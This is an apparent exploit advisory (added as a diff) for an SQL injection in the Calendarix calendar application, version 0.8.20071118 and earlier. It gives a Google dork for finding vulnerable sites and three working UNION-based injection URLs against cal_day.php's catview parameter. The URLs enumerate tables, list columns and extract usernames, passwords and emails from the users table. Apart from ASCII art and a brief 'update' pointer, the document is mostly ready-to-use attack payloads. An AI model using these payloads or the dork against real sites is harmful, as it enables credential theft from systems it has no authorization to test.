@@ -1,0 +1,57 @@
+#######################[ Informatique inside ]##########################
+#Calendarix           :  SQL injection
+#Version              :  0.8.20071118 et < inf&#65533;rieur 
+#Author               :  Thibow
+#Contact              :  Thibow[4t]linformatique-inside[dot]com
+#Location             :  France
+#Website              :  http://www.informatique-inside.com
+#Dork                 :  "inurl:cal_day.php?op=day&catview="
+#Solution             :  Update: http://www.calendarix.com/
+########################################################################
+
+                 .   :
+                   :::III
+                   .:::IIIII
+                   .:IIIIIIIIII...
+                     :IIHIIIIIIIII:.
+                      :IIIIIIIIIII:::
+    .:IIIIIIIIIIIII:   :IIIIIIIIII:::MI. .
+     ..:::IIIIIIIIIIII  :IIIIIII::::MMH.:
+    .::IIHMHIIIIIIIIIII: IIIIII::::MMM.M .:
+   ....::IHHMIIIIIIIIIII.:IIII::::MMMIM .I:
+   ...::IIIIHHIIIIIIIIIII:III:::::MMMM:.H:
+          .:IIIIIIIIIIIIIHI::::::M.H.M II
+            .:IIIIIIIIIIIMI:::::M. :M :M.
+              .IIIIIIII::MI::::M:  HM:M:
+              .:IIII:::::MI:::M:..IMMHH.
+          . .:I:I::::::::MI::M:. :MMMM:
+         . .IMI..::::::::MI:H.:.:MMMHM.
+        : :MMI.  .:::::::MI.:::HMMMMHI
+       : :MMI.    :::::III I HMMMIMMM:
+      :.:MMI.     .IIII: I:.MMMM: MMM.
+     .::MMI.       II:.II:HMMMH. .MMM.
+     I::II.         II:.IMMMH:.  IMMM:
+     ..::II:      III :IIMMH.    HHHM:
+    ::. .::. .::II..IIIIIMI.     HHHM:
+    II::.:II::: .IMMMIIIIMI.    MMMMM:
+     IIII:.:HMMMMMMMMIIIIMI.   :MMMMM:
+     .MIIIMMMMMMMH:. .IIIMH.. .MMMMMM:
+      :MMMMMMI:..     IIIIH:.MMMHMMMI
+       :HMMH.         .MMMMMMMM:MMMI.
+                    .IMMMMMM::HMMM.
+                         .:IMMMM:.
+
+
+########################################################################
+
+#=Sql Injection=========================================================================================================================================================#
+# Exploit[Liste les tables] 
+# =>http://[vulnWebSite]/cal_day.php?op=day&catview=-2 union all select group_concat(table_name) from information_schema.tables where table_schema=database()--     
+# 
+# Exploit[Colonnes de la tables users - Attention, en fonction du nom des tables !]
+# => http://[vulnWebSite]/cal_day.php?op=day&catview=-2%20union%20all%20select%20group_concat%28column_name%29%20from%20information_schema.columns%20where%20table_name=0x63616c656e64617269785f7573657273--
+#
+# Exploit[Extraction des donn&#65533;es de la BDD]
+# => http://[vulnWebSite]/cal_day.php?op=day&catview=-2%20union%20all%20select%20concat_ws%280x3a,username,0x3a,password,0x3a,email,0x3a,url%29%20from%20calendarix_users--
+#
+#=======================================================================================================================================================================
